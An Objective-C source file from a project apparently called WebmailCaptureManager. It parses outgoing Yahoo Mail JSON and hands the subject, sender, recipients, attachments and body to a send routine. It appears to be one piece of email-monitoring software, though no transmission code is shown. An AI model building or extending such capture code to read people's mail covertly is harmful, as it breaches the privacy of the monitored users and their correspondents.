//
//  WebmailHTMLParser+Yahoo.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/7/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "WebmailHTMLParser+Yahoo.h"
#import "NSArray+Webmail.h"

@implementation WebmailHTMLParser (Yahoo)

+ (void) parseYahoo_OugoingJSON: (NSString *) aJSON app: (NSString *) aAppName {
    if (aJSON) {
        NSError *jsonError = nil;
        DLog(@"aJSON : %@", aJSON);
        NSData *jsonData = [aJSON dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *yahooMessage = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                     options:NSJSONReadingMutableContainers
                                                                       error:&jsonError];
        
        [self readyToSend_subject:[yahooMessage objectForKey:@"subject"] sender:[yahooMessage objectForKey:@"sender_name"] senderEmail:[yahooMessage objectForKey:@"sender_address"] senderImageUrl:nil sentDate:[yahooMessage objectForKey:@"send_date"] receiver:[yahooMessage objectForKey:@"recipient_names"] receiverEmail:[yahooMessage objectForKey:@"recipient_addresses"] receiverImageUrl:nil attachment:[yahooMessage objectForKey:@"attachment_filenames"] messageBody:[yahooMessage objectForKey:@"body_message"] mailType:aAppName direction:1];
        DLog(@"yahooMessage : %@", yahooMessage);
    }
}

@end
